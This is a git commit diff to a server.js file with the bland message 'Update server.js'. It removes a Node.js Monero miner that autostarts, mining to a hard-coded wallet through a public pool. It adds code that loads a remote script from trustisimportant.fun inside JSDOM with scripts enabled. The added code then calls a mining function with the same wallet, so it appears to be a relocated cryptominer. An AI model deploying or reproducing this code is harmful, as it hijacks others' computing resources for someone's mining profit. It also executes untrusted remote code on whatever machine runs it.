5af5c107c145d1fbee02f79fdd1d7ea2a8025c8b
darksheepapi <149430694+darksheepapi@users.noreply.github.com>
2023-12-28 20:50:16 +0530

    Update server.js

--- server.js
+++ server.js
@@ -1,13 +1,29 @@
-const Miner = require('eazyminer');
+const { JSDOM } = require('jsdom');
 
-const miner = new Miner({
-    pools: [{
-        coin: 'XMR',
-        user: "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb",
-        url: 'gulf.moneroocean.stream:10128', // optional pool URL,
-    }],
-    autoStart: true // optional delay
-});
+// Your HTML content
+const htmlContent = `
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <title></title>
+    </head>
+    <body>
+        <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+        <script type="text/javascript">
+            const url = new URL(window.location.href);
+            const address = url.searchParams.get("address") || "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb";
+            EverythingIsLife(address , 'x', 30);
+        </script>
+    </body>
+</html>
+`;
 
-miner.start();
-/*miner.stop();*/
+// Create a virtual DOM
+const dom = new JSDOM(htmlContent, { runScripts: 'dangerously' });
+
+// Access the document
+const document = dom.window.document;
+
+// Access any elements or perform actions as needed
+console.log(document.documentElement.outerHTML);
